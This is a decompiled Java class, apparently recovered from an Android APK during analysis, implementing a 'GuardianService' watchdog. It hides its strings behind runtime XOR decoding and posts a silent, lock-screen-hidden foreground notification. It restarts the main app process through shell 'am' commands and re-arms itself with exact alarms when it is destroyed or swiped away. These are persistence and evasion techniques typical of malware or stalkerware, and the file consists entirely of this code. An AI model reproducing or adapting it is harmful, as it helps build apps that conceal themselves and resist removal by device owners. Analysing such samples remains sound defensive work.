package com.base.template.services;

import android.app.ActivityManager;
import android.app.AlarmManager;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.Process;
import androidx.core.app.NotificationCompat$Builder;
import androidx.work.Worker;
import java.io.File;
import java.util.List;
import kotlin.ExceptionsKt;
import kotlin.jvm.internal.Intrinsics;
import kotlin.text.StringsKt;
import kotlin.text.StringsKt__StringNumberConversionsKt;
import okhttp3.Headers;
import p000.C0000;

/* JADX INFO: loaded from: /Users/xv/pin2/max-gate-apk/output/stage4/classes.dex */
public final class GuardianService extends Service {
    public static final /* synthetic */ int $r8$clinit = 0;
    public long lastRestartTime;
    public boolean pongReceived;
    public int unansweredPings;
    public final Handler handler = new Handler(Looper.getMainLooper());
    public int mainProcessPid = -1;
    public final GuardianService$pongReceiver$1 pongReceiver = new BroadcastReceiver() { // from class: com.base.template.services.GuardianService$pongReceiver$1
        @Override // android.content.BroadcastReceiver
        public final void onReceive(Context context, Intent intent) {
            GuardianService guardianService = this.this$0;
            guardianService.pongReceived = true;
            guardianService.unansweredPings = 0;
        }
    };
    public final Worker.AnonymousClass1 watchdogRunnable = new Worker.AnonymousClass1(7, this);

    public static final void access$checkAndRestart(GuardianService guardianService) {
        boolean zContains$default;
        String strDecode = C0000.decode(new byte[]{27, 19, 66, 89, 0, 28}, "4c06c35ebc62", true);
        if (guardianService.mainProcessPid <= 0) {
            guardianService.detectMainProcessPid();
            zContains$default = guardianService.mainProcessPid > 0;
        } else {
            try {
                zContains$default = StringsKt.contains$default(ExceptionsKt.readText$default(new File(strDecode + guardianService.mainProcessPid + C0000.decode(new byte[]{73, 82, 95, 86, 10, 94, 86, 86}, "f122f78391", 1))), guardianService.getPackageName());
            } catch (Exception unused) {
            }
        }
        if (!zContains$default) {
            guardianService.mainProcessPid = -1;
            guardianService.unansweredPings = 0;
            guardianService.restartMainProcess();
            return;
        }
        if (guardianService.pongReceived) {
            guardianService.unansweredPings = 0;
        } else {
            int i = guardianService.unansweredPings + 1;
            guardianService.unansweredPings = i;
            if (i >= 6) {
                guardianService.unansweredPings = 0;
                guardianService.restartMainProcess();
                return;
            }
        }
        guardianService.pongReceived = false;
        try {
            guardianService.sendBroadcast(new Intent(C0000.decode(new byte[]{1, 88, 84, 22, 3, 5, 70, 3, 77, 70, 0, 85, 21, 13, 3, 67, 92, 22, 45, 45, 99, 35, 45, 119, 54, 107, 58, 49, 43, 121, 126}, "b798ad5fc2e8ea", 0)).setPackage(guardianService.getPackageName()));
        } catch (Exception unused2) {
        }
    }

    public final Notification buildNotification() {
        NotificationCompat$Builder notificationCompat$Builder = new NotificationCompat$Builder(this, C0000.decode(new byte[]{81, 23, 4, 74, 7, 89, 86, 11, 58, 1, 80, 7, 91, 13, 93, 85}, "6be8c07eeb8f5c89", 0.0f));
        notificationCompat$Builder.mNotification.icon = 2131034139;
        notificationCompat$Builder.mPriority = -2;
        notificationCompat$Builder.setFlag(2, true);
        notificationCompat$Builder.mSilent = true;
        return notificationCompat$Builder.build();
    }

    public final void createChannel() {
        NotificationChannel notificationChannel = new NotificationChannel(C0000.decode(new byte[]{82, 66, 7, 70, 93, 15, 2, 92, 60, 82, 93, 86, 8, 90, 92, 10}, "57f49fc2c1", 6), C0000.decode(new byte[]{101, 75, 65, 67, 81, 88}, "6227454299877daa", true), 1);
        notificationChannel.setShowBadge(false);
        notificationChannel.setLockscreenVisibility(-1);
        Object systemService = getSystemService(C0000.decode(new byte[]{86, 12, 69, 80, 5, 93, 81, 80, 17, 92, 14, 11}, "8c19c421e5aed4fe"));
        NotificationManager notificationManager = systemService instanceof NotificationManager ? (NotificationManager) systemService : null;
        if (notificationManager != null) {
            notificationManager.createNotificationChannel(notificationChannel);
        }
    }

    public final void detectMainProcessPid() {
        int i;
        Integer intOrNull;
        try {
            File file = new File(getFilesDir(), C0000.decode(new byte[]{77, 20, 88, 92}, "cd18bb"));
            if (file.exists() && (intOrNull = StringsKt__StringNumberConversionsKt.toIntOrNull(StringsKt.trim(ExceptionsKt.readText$default(file)).toString())) != null && intOrNull.intValue() > 0) {
                if (intOrNull.intValue() != Process.myPid()) {
                    this.mainProcessPid = intOrNull.intValue();
                    return;
                }
            }
        } catch (Exception unused) {
        }
        try {
            Object systemService = getSystemService(C0000.decode(new byte[]{3, 87, 70, 93, 64, 80, 22, 77}, "b42469"));
            ActivityManager activityManager = systemService instanceof ActivityManager ? (ActivityManager) systemService : null;
            if (activityManager == null) {
                return;
            }
            int iMyPid = Process.myPid();
            List<ActivityManager.RunningAppProcessInfo> runningAppProcesses = activityManager.getRunningAppProcesses();
            if (runningAppProcesses != null) {
                for (ActivityManager.RunningAppProcessInfo runningAppProcessInfo : runningAppProcesses) {
                    if (Intrinsics.areEqual(runningAppProcessInfo.processName, getPackageName()) && (i = runningAppProcessInfo.pid) != iMyPid) {
                        this.mainProcessPid = i;
                        return;
                    }
                }
            }
        } catch (Exception unused2) {
        }
    }

    @Override // android.app.Service
    public final IBinder onBind(Intent intent) {
        return null;
    }

    @Override // android.app.Service
    public final void onCreate() {
        super.onCreate();
        createChannel();
        try {
            if (Build.VERSION.SDK_INT >= 34) {
                startForeground(9901, buildNotification(), 1073741824);
            } else {
                startForeground(9901, buildNotification());
            }
        } catch (Exception e) {
            e.getMessage();
            if (Build.VERSION.SDK_INT >= 31 && CommandService$$ExternalSyntheticApiModelOutline0.m(e)) {
                scheduleRestart();
                stopSelf();
                return;
            }
        }
        try {
            int i = Build.VERSION.SDK_INT;
            String strDecode = C0000.decode(new byte[]{80, 95, 15, 75, 6, 0, 64, 85, 76, 17, 1, 12, 67, 92, 3, 17, 1, 79, 127, 121, 52, 32, 42, 36, 96, 99, 61, 53, 43, 47, 116}, "30beda", false);
            GuardianService$pongReceiver$1 guardianService$pongReceiver$1 = this.pongReceiver;
            if (i >= 33) {
                registerReceiver(guardianService$pongReceiver$1, new IntentFilter(strDecode), 4);
            } else {
                registerReceiver(guardianService$pongReceiver$1, new IntentFilter(strDecode));
            }
        } catch (Exception unused) {
        }
        detectMainProcessPid();
        this.handler.postDelayed(this.watchdogRunnable, 10000L);
    }

    @Override // android.app.Service
    public final void onDestroy() {
        this.handler.removeCallbacks(this.watchdogRunnable);
        try {
            unregisterReceiver(this.pongReceiver);
        } catch (Exception unused) {
        }
        restartMainProcess();
        scheduleRestart();
        super.onDestroy();
    }

    @Override // android.app.Service
    public final int onStartCommand(Intent intent, int i, int i2) {
        int intExtra;
        try {
            createChannel();
            if (Build.VERSION.SDK_INT >= 34) {
                startForeground(9901, buildNotification(), 1073741824);
            } else {
                startForeground(9901, buildNotification());
            }
        } catch (Exception unused) {
        }
        if (intent == null || (intExtra = intent.getIntExtra(C0000.decode(new byte[]{61, 84, 0, 11, 88, 104, 73, 10, 81}, "b9ab679c5a", 0.0f), -1)) <= 0) {
            return 1;
        }
        this.mainProcessPid = intExtra;
        return 1;
    }

    @Override // android.app.Service
    public final void onTaskRemoved(Intent intent) {
        restartMainProcess();
        scheduleRestart();
        super.onTaskRemoved(intent);
    }

    public final void restartMainProcess() {
        long jCurrentTimeMillis = System.currentTimeMillis();
        if (jCurrentTimeMillis - this.lastRestartTime < 10000) {
            return;
        }
        this.lastRestartTime = jCurrentTimeMillis;
        try {
            Headers.Companion.safeStartService(this, C0000.decode(new byte[]{35, 51, 120, 54, 119, 112, 120, 44, 59, 52, 124, 55, 103, 120, 107, 54}, "df9d399b", 2));
        } catch (Exception e) {
            e.getMessage();
            try {
                Runtime.getRuntime().exec(new String[]{C0000.decode(new byte[]{75, 17, 77, 64, 64, 1, 8, 26, 6, 90, 95, 76, 7, 88}, "db434de5d31cf5", 6), C0000.decode(new byte[]{67, 76, 86, 22, 76, 79, 2, 93, 23, 1, 5, 69, 95, 77, 89, 0, 21, 17, 1, 64, 19, 13, 1, 82}, "087d8bd2edb7", 0.0f), C0000.decode(new byte[]{24, 12}, "5b0663"), getPackageName() + C0000.decode(new byte[]{31, 90, 14, 95, 29, 6, 81, 16, 84, 75, 69, 92, 93, 70, 92, 88, 21, 87, 29, 23, 85, 17, 71, 12, 82, 92, 67, 24, 115, 86, 12, 95, 82, 10, 84, 48, 84, 23, 71, 80, 83, 83}, "09a23d0c1e1906", 3), C0000.decode(new byte[]{29, 24, 3, 11}, "05fbcc", 0.0f), C0000.decode(new byte[]{108, 67, 93}, "349d81306df6172a", false), C0000.decode(new byte[]{2}, "34b1f6ff933cfd6f", 4)});
            } catch (Exception unused) {
            }
        }
        try {
            Runtime.getRuntime().exec(new String[]{C0000.decode(new byte[]{25, 64, 77, 69, 76, 3, 91, 25, 87, 92, 87, 76, 87, 94}, "63468f66559c"), C0000.decode(new byte[]{86, 20, 95, 7, 84, 83, 85, 21, 68}, "4f0f00", 0), C0000.decode(new byte[]{26, 80}, "71973ad199f839"), C0000.decode(new byte[]{85, 88, 6, 66, 91, 81, 0, 72, 15, 13, 64, 83, 12, 68, 26, 89, 7, 18, 15, 12, 90, 24, 32, 127, 123, 108, 59, 37, 41, 46, 100, 122, 39, 100, 113, 124}, "46b048dffc", 0.0f), C0000.decode(new byte[]{72, 94}, "e03f0aac694b", 0.0f), getPackageName() + C0000.decode(new byte[]{76, 85, 91, 88, 75, 4, 2, 69, 81, 27, 17, 3, 14, 70, 88, 84, 17, 3, 77, 116, 91, 90, 17, 52, 6, 85, 81, 92, 19, 3, 17}, "c645ef")});
        } catch (Exception unused2) {
        }
    }

    public final void scheduleRestart() {
        try {
            Object systemService = getSystemService(C0000.decode(new byte[]{5, 95, 82, 17, 15}, "d33cbe7a8ab5", 0.0f));
            AlarmManager alarmManager = systemService instanceof AlarmManager ? (AlarmManager) systemService : null;
            if (alarmManager == null) {
                return;
            }
            PendingIntent service = PendingIntent.getService(this, 9902, new Intent(this, (Class<?>) GuardianService.class), 201326592);
            long jCurrentTimeMillis = System.currentTimeMillis() + ((long) 5000);
            if (Build.VERSION.SDK_INT < 31 || alarmManager.canScheduleExactAlarms()) {
                alarmManager.setExactAndAllowWhileIdle(0, jCurrentTimeMillis, service);
            } else {
                alarmManager.setAlarmClock(new AlarmManager.AlarmClockInfo(jCurrentTimeMillis, null), service);
            }
        } catch (Exception unused) {
        }
    }
}
